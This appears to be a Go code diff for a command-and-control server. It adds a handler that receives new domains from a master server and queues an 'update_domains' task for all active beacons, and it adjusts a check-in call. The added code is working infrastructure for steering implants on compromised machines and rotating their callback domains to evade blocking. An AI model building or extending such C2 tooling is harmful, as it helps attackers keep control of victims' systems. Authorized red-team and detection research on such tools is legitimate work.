@@ -10,6 +10,7 @@ package main
 
 import (
 	"context"
+	"encoding/json"
 	"flag"
 	"fmt"
 	"math/rand"
@@ -579,7 +580,7 @@ func main() {
 		"startup_time": time.Now().Unix(),
 	}
 
-	_, err = masterClient.Checkin(stats)
+	_, _, err = masterClient.Checkin(stats)
 	if err != nil {
 		fmt.Printf("⚠️  WARNING: Initial checkin to Master Server failed: %v\n", err)
 		fmt.Println("Continuing in resilient mode (will retry in background)")
@@ -618,6 +619,36 @@ func main() {
 				logf("[C2] ✅ Successfully cached %d chunks for %s", len(task.Chunks), task.ClientBinaryID)
 			}
 		}
+	}, func(domainUpdates []string) {
+		// Handle domain updates from Master - queue update_domains task for all beacons
+		if len(domainUpdates) == 0 {
+			return
+		}
+
+		logf("[C2] 🌐 Received domain update from Master: %v", domainUpdates)
+
+		// Convert domain list to JSON
+		domainsJSON, err := json.Marshal(domainUpdates)
+		if err != nil {
+			logf("[C2] ❌ Failed to marshal domain list: %v", err)
+			return
+		}
+
+		// Queue update_domains task for ALL active beacons
+		beacons := c2Manager.GetBeacons()
+		taskCommand := fmt.Sprintf("update_domains:%s", string(domainsJSON))
+
+		activeCount := 0
+		for _, beacon := range beacons {
+			// AddTask returns the taskID, we don't need to generate it
+			taskID := c2Manager.AddTask(beacon.ID, taskCommand)
+			if taskID != "" {
+				logf("[C2] 📤 Queued domain update task %s for beacon %s", taskID, beacon.ID)
+				activeCount++
+			}
+		}
+
+		logf("[C2] ✅ Queued domain updates for %d beacon(s)", activeCount)
 	})
 
 	// Start periodic task polling (every 10 seconds)
